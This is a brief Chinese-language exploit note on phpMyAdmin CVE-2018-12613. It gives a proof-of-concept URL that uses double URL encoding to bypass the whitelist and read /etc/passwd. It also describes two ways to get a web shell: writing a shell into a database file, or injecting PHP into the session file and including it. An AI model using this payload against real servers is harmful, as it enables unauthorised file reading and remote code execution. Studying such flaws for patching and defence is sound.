# PhpMyAdmin

## CVE-2018-12613

``include $_REQUEST['target'];`` 引发的LFI+RCE

POC:
```
index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
```

``%253f``使得urldecode后 ``db_sql.php``被截取绕过白名单

在数据库文件中写入shell

然后通过``show variables like '%datadir%'``找到数据库存放地址

就可以getshell

也可通过session包含的方式

>We can execute SELECT '<?=phpinfo()?>';, then check your sessionid (the value of phpMyAdmin in the cookie), and then include the session file:

来getshell

参考资料 https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog
